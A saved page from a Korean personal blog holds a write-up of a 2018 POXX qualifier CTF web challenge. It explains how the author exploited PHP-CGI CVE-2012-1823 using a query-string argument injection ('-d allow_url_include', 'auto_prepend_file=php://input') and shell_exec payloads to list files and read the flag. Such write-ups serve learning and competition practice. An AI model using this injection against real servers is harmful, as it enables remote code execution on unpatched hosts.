@@ -1,0 +1,46 @@
+<!DOCTYPE html><html><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-W055DP4N3J"></script><script>
+					window.dataLayer = window.dataLayer || [];
+					function gtag(){dataLayer.push(arguments);}
+					gtag('js', new Date());
+					gtag('config', 'G-W055DP4N3J');</script><head><meta charSet="utf-8"/><meta name="description" content="기록 저장소"/><meta property="og:description" content="기록 저장소"/><meta property="og:url" content="https://mitny.github.io"/><meta property="og:type" content="website"/><meta property="og:locale" content="ko_KR"/><meta property="og:site_name" content="MitNy.log"/><meta name="viewport" content="initial-scale=1.0, width=device-width"/><title>[CTF] 2018 POXX 예선 MyFirstServerInfo write up |  MitNy.log</title><meta name="robots" content="index,follow"/><meta property="og:title" content="[CTF] 2018 POXX 예선 MyFirstServerInfo write up |  MitNy.log"/><link rel="canonical" href="https://mitny.github.io/articles/2018-10-14-CTF-POXX-MyFirstServerInfo"/><meta name="next-head-count" content="12"/><meta name="naver-site-verification" content="b408dee953bcbbb1038384f191f36dac0551c0fb"/><meta name="google-site-verification" content="vUtYhRYNCWYYTdurCRaVmtnWpPLuXKKwRAm5F6R9sNs"/><link rel="preload" href="/_next/static/css/e6a7c67d207b98b3.css" as="style"/><link rel="stylesheet" href="/_next/static/css/e6a7c67d207b98b3.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-69bfa6990bb9e155.js" defer=""></script><script src="/_next/static/chunks/framework-5f4595e5518b5600.js" defer=""></script><script src="/_next/static/chunks/main-005bdf76005efab4.js" defer=""></script><script src="/_next/static/chunks/pages/_app-14a2a9a26060c1d3.js" defer=""></script><script src="/_next/static/chunks/401-9f1400d964d6d7ce.js" defer=""></script><script src="/_next/static/chunks/pages/articles/%5Bdir_slug%5D/%5Bslug%5D-0b7b92862b8a360a.js" defer=""></script><script src="/_next/static/nJPyYqODS0udXw2rMLLyn/_buildManifest.js" defer=""></script><script src="/_next/static/nJPyYqODS0udXw2rMLLyn/_ssgManifest.js" defer=""></script></head><link rel="apple-touch-icon" sizes="57x57" href="/favicon/apple-icon-57x57.png"/><link rel="apple-touch-icon" sizes="60x60" href="/favicon/apple-icon-60x60.png"/><link rel="apple-touch-icon" sizes="72x72" href="/favicon/apple-icon-72x72.png"/><link rel="apple-touch-icon" sizes="76x76" href="/favicon/apple-icon-76x76.png"/><link rel="apple-touch-icon" sizes="114x114" href="/favicon/apple-icon-114x114.png"/><link rel="apple-touch-icon" sizes="120x120" href="/favicon/apple-icon-120x120.png"/><link rel="apple-touch-icon" sizes="144x144" href="/favicon/apple-icon-144x144.png"/><link rel="apple-touch-icon" sizes="152x152" href="/favicon/apple-icon-152x152.png"/><link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-icon-180x180.png"/><link rel="icon" type="image/png" sizes="192x192" href="/favicon/android-icon-192x192.png"/><link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="96x96" href="/favicon/favicon-96x96.png"/><link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png"/><link rel="manifest" href="/favicon/manifest.json"/><meta name="msapplication-TileColor" content="#ffffff"/><meta name="msapplication-TileImage" content="/favicon/ms-icon-144x144.png"/><meta name="theme-color" content="#ffffff"/><body><div id="__next" data-reactroot=""><div class="header h-16 bg-white drop-shadow-md text-black"><div class="mx-10 pt-3 cursor-pointer"><p class="header-home text-3xl float-left">MitNy.log</p><p class="text-base font-bold pt-2 float-right">About</p></div></div><div class="mx-10 my-8"><div class="w-full min-h-screen pb-24 mt-8"><div class="w-full min-h-screen pb-24 mt-8"><article class="prose max-w-none"><div class="border-b"><p class="text-4xl font-bold mb-0">[CTF] 2018 POXX 예선 MyFirstServerInfo write up</p><p class="text-xs text-neutral-500"></p></div><div><p>2018년도 Power of XX 의 예선에 참가했습니다. 작년엔 본선에 진출했으나 올해는 아쉽게도 예선만 참가하게 됐네요 :(
+이 문제는 저에게 의미있는 문제가 될 것 같아요. 왜냐하면 공식적인 대회에서 플래그를 찾아낸 첫번째 문제거든요!
+문제 이름에도 First가 들어가고..ㅎㅎ 앞으로 플래그를 보는게 익숙해졌으면 좋겠네요</p>
+<p><img src="/assets/posts/ctf/POXX2018/phpinfo.png" alt=""></p>
+<p>문제 페이지에 들어가면 <code>phpinfo</code>가 보인다.
+지금까지 phpinfo 관련 문제들은 꽤 봐왔으나, 그때마다 이걸 보고 뭘 알아낼 수 있지? 어떻게 공격하지? 라는 생각만 들었다.
+그래도 이번엔 열심히 취약점을 찾아봐야겠다는 생각으로 자세히 보니 cgi 라는게 많이 보였다.
+cgi를 처음 알게 된건 이번 학기 네트워크 수업 실습때였는데, cgi를 사용하여 python과 html을 같이 쓰는거였다.</p>
+<p><code>cgi</code>란 공용 게이트웨이 인터페이스(Common Gateway interface)의 약자로 웹 서버 상에서 사용자 프로그램을 동작시키기 위한 조합이다.</p>
+<p>그래서 cgi 취약점에 대해 찾아보다가 PHP-CGI(CVE-2012-1823) 취약점에 대해 포스팅한 글을 보게되었다.
+<a href="https://m.blog.naver.com/PostView.nhn?blogId=heapskewl73&#x26;logNo=221130879514&#x26;proxyReferer=https%3A%2F%2Fwww.google.co.kr%2F" target="_blank" rel="noopener noreferrer">참고</a></p>
+<p>취약점 요약: 2012년 1월 PHP 5.4.2 이전 버전에서 원격 코드 실행이 가능한 취약점이 발견됐다. 이 취약점은 sapi/cgi/cgi_main.c 파일 내의 CGI 스크립트(php-cgi)가 -s,-d,-c 등의 매개 변수를 적절히 검증하지 않아 발생한다.</p>
+<ol>
+<li>
+<p>취약점 대상
+<img src="/assets/posts/ctf/POXX2018/php-table1.png" alt=""></p>
+</li>
+<li>
+<p>취약점 공격(php-cgi 주요 옵션)
+<img src="/assets/posts/ctf/POXX2018/php-table2.png" alt=""></p>
+</li>
+<li>
+<p>취약점 공격(php.ini 주요 설정)
+<img src="/assets/posts/ctf/POXX2018/php-table3.png" alt=""></p>
+</li>
+</ol>
+<p>위 옵션들을 바탕으로 문제 페이지에 넘겨보면</p>
+<p><img src="/assets/posts/ctf/POXX2018/php-s.png" alt=""></p>
+<p>-s 옵션의 경우 색깔은 안입혀지지만 소스코드가 보이는 것을 확인할 수 있다.</p>
+<p><img src="/assets/posts/ctf/POXX2018/php-burp-id.png" alt="">
+-d 과 allow_url_include=1, auto_prepend_file=php://input 을 사용해 시스템 함수를 사용할 수 있다.
+<code>?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input</code>
+<code>&#x3C;?php $contents = shell_exec("id"); echo "$contents"; die;</code></p>
+<p><img src="/assets/posts/ctf/POXX2018/php-id.png" alt=""></p>
+<p>이 결과를 이용해 ls를 하면 파일 리스트가 뜨지 않을까 싶었다.</p>
+<p><img src="/assets/posts/ctf/POXX2018/php-burp-ls.png" alt=""></p>
+<p><code>&#x3C;?php $contents = shell_exec("ls"); echo "$contents"; die;</code></p>
+<p><img src="/assets/posts/ctf/POXX2018/php-ls.png" alt=""></p>
+<p>index.php 파일과 알파벳+숫자로 이루어진 텍스트 파일이 있는 것을 확인할 수 있다.
+다행히 바로 저 파일에 접근할 수 있었다.</p>
+<p><img src="/assets/posts/ctf/POXX2018/php-flag.png" alt=""></p>
+<p>플래그 :)</p></div></article></div></div></div><footer class="h-16 bg-neutral-500"></footer></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"slug":"2018-10-14-CTF-POXX-MyFirstServerInfo","content":"\n2018년도 Power of XX 의 예선에 참가했습니다. 작년엔 본선에 진출했으나 올해는 아쉽게도 예선만 참가하게 됐네요 :(\n이 문제는 저에게 의미있는 문제가 될 것 같아요. 왜냐하면 공식적인 대회에서 플래그를 찾아낸 첫번째 문제거든요!\n문제 이름에도 First가 들어가고..ㅎㅎ 앞으로 플래그를 보는게 익숙해졌으면 좋겠네요\n\n![](/assets/posts/ctf/POXX2018/phpinfo.png)\n\n문제 페이지에 들어가면 `phpinfo`가 보인다.\n지금까지 phpinfo 관련 문제들은 꽤 봐왔으나, 그때마다 이걸 보고 뭘 알아낼 수 있지? 어떻게 공격하지? 라는 생각만 들었다.\n그래도 이번엔 열심히 취약점을 찾아봐야겠다는 생각으로 자세히 보니 cgi 라는게 많이 보였다.\ncgi를 처음 알게 된건 이번 학기 네트워크 수업 실습때였는데, cgi를 사용하여 python과 html을 같이 쓰는거였다.\n\n`cgi`란 공용 게이트웨이 인터페이스(Common Gateway interface)의 약자로 웹 서버 상에서 사용자 프로그램을 동작시키기 위한 조합이다.\n\n그래서 cgi 취약점에 대해 찾아보다가 PHP-CGI(CVE-2012-1823) 취약점에 대해 포스팅한 글을 보게되었다.\n[참고](https://m.blog.naver.com/PostView.nhn?blogId=heapskewl73\u0026logNo=221130879514\u0026proxyReferer=https%3A%2F%2Fwww.google.co.kr%2F)\n\n\n취약점 요약: 2012년 1월 PHP 5.4.2 이전 버전에서 원격 코드 실행이 가능한 취약점이 발견됐다. 이 취약점은 sapi/cgi/cgi_main.c 파일 내의 CGI 스크립트(php-cgi)가 -s,-d,-c 등의 매개 변수를 적절히 검증하지 않아 발생한다.\n\n1. 취약점 대상\n![](/assets/posts/ctf/POXX2018/php-table1.png)\n\n2. 취약점 공격(php-cgi 주요 옵션)\n![](/assets/posts/ctf/POXX2018/php-table2.png)\n\n3. 취약점 공격(php.ini 주요 설정)\n![](/assets/posts/ctf/POXX2018/php-table3.png)\n\n위 옵션들을 바탕으로 문제 페이지에 넘겨보면\n\n![](/assets/posts/ctf/POXX2018/php-s.png)\n\n-s 옵션의 경우 색깔은 안입혀지지만 소스코드가 보이는 것을 확인할 수 있다.\n\n![](/assets/posts/ctf/POXX2018/php-burp-id.png)\n-d 과 allow_url_include=1, auto_prepend_file=php://input 을 사용해 시스템 함수를 사용할 수 있다.\n`?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input`\n`\u003c?php $contents = shell_exec(\"id\"); echo \"$contents\"; die;`\n\n![](/assets/posts/ctf/POXX2018/php-id.png)\n\n이 결과를 이용해 ls를 하면 파일 리스트가 뜨지 않을까 싶었다.\n\n![](/assets/posts/ctf/POXX2018/php-burp-ls.png)\n\n`\u003c?php $contents = shell_exec(\"ls\"); echo \"$contents\"; die;`\n\n![](/assets/posts/ctf/POXX2018/php-ls.png)\n\nindex.php 파일과 알파벳+숫자로 이루어진 텍스트 파일이 있는 것을 확인할 수 있다.\n다행히 바로 저 파일에 접근할 수 있었다.\n\n![](/assets/posts/ctf/POXX2018/php-flag.png)\n\n플래그 :)\n","layout":"post","title":"[CTF] 2018 POXX 예선 MyFirstServerInfo write up","categories":["CTF"],"excerpt":" ","comments":true,"share":true,"tags":["Web-hacking","CTF","POXX","write-up"]}},"__N_SSG":true},"page":"/articles/[dir_slug]/[slug]","query":{"dir_slug":"2018-10","slug":"CTF-POXX-MyFirstServerInfo"},"buildId":"nJPyYqODS0udXw2rMLLyn","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
